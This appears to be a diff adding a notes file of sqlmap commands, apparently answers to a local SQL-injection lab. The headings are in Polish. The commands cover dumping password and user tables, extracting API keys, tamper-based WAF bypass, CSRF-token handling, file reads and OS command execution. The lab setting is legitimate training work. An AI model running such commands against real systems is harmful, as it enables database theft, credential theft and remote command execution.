@@ -1,0 +1,28 @@
+sqlmap --wizard
+sqlmap --wizard --dump-all
+sqlmap --data "product_id=a" -u http://localhost/2/ --batch --dump -T products -C "name,secret"
+sqlmap -u http://localhost/3/ --data="a=g9dfg&b=8134ga&c=gsfy5&d=fh687xcbv&search=*"  --batch --dbms sqlite --sql-query="SELECT value FROM configs WHERE name = 'api_key'"
+sqlmap -u http://localhost/4/ --batch --forms --technique B --level 2 --dump -T users
+sqlmap -u http://localhost/5/ --level 3 --technique T --batch --count -T agents --time-sec 1
+sqlmap -u http://localhost/zadania/2/?domain=google.com --level 2 --sql-query="SELECT content FROM secrets WHERE title = 'sekret3'" --batch
+
+--prosrt WAF--
+ sqlmap -u http://localhost/6/ --data="username=abc&password=def" --headers="Tajny-Naglowek: tajna_wartosc" --random-agent --batch --dump -T passwords --where="username='admin'" --time-sec 1
+
+--Zawansowany WAF--
+sqlmap -u http://localhost/7/?id=1 --tamper="randomcase" --batch --dump -T orders --start 1 --stop 2
+
+sqlmap http://localhost/8/?note_id=okty --tamper="base32encode" --batch --sql-query="SELECT * FROM notes WHERE user='kacper'"
+
+--Prefix--
+sqlmap http://localhost/9/ --data="post_id=1" --prefix="*/" --suffix="/*" --sql-query="SELECT * FROM posts WHERE status = 0" --batch
+
+--CSRF--
+sqlmap -u http://localhost/10/ --data="product_id=*&tokenik=abc" --csrf-token tokenik(pole pobrane z strony) --batch --level 2 -T accounts --dump
+
+--File Read--
+sqlmap -u http://localhost/14/?id=1 --batch --is-dba
+sqlmap -u http://localhost/14/?id=1 --batch --file-read="/flag/sekret.txt"
+
+--RCE--
+sqlmap -u http://localhost/15/?sort=price --os-cmd="printenv API_SECRET"
